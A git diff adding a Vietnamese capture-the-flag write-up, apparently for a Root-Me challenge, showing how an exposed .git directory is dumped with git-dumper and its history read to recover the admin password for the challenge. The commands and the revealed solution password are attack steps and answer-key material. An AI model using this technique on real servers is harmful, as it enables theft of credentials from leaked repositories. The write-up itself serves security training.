@@ -680,3 +680,49 @@ Vậy chỉnh sửa `visiteur` thành `admin`:
 Reload trang web, chúng ta lụm thành công password:
 
 ![image](images/http-cookies/image-5.png)
+
+## Insecure Code Management
+
+> Protect your code management server?
+>
+> Get the password (in clear text) from the admin account.
+
+![image](images/insecure-code-management/image-1.png)
+
+Nếu chúng ta thực hiện fuzzing sẽ thấy server có một thư mục `.git`:
+
+![image](images/insecure-code-management/image-2.png)
+
+Sử dụng công cụ [git-dumper](https://github.com/arthaud/git-dumper) để tải hết các files và thư mục về lưu vào `test`:
+
+```text
+$ git-dumper http://challenge01.root-me.org/web-serveur/ch61/ test
+...
+$ cd test
+```
+
+Tại thư mục `test`, chúng ta sử dụng lệnh `git reflog` để xem lịch sử commits:
+
+```text
+$ git reflog
+c0b4661 (HEAD -> master) HEAD@{0}: commit: blue team want sha256!!!!!!!!!
+550880c HEAD@{1}: commit: renamed app name
+a8673b2 HEAD@{2}: commit: changed password
+1572c85 HEAD@{3}: commit: secure auth with md5
+5e0e146 HEAD@{4}: commit (initial): Initial commit for the new HR database access
+```
+
+Dùng lệnh `git diff a8673b2` để xem sự thay đổi ở commit, chúng ta tìm được password là `s3cureP@ssw0rd`:
+
+```text
+$ git diff a8673b2
+diff --git a/config.php b/config.php
+index e11aad2..663fe35 100644
+--- a/config.php
++++ b/config.php
+@@ -1,3 +1,3 @@
+ <?php
+        $username = "admin";
+-       $password = "s3cureP@ssw0rd";
++       $password = "0c25a741349bfdcc1e579c8cd4a931fca66bdb49b9f042c4d92ae1bfa3176d8c";
+```
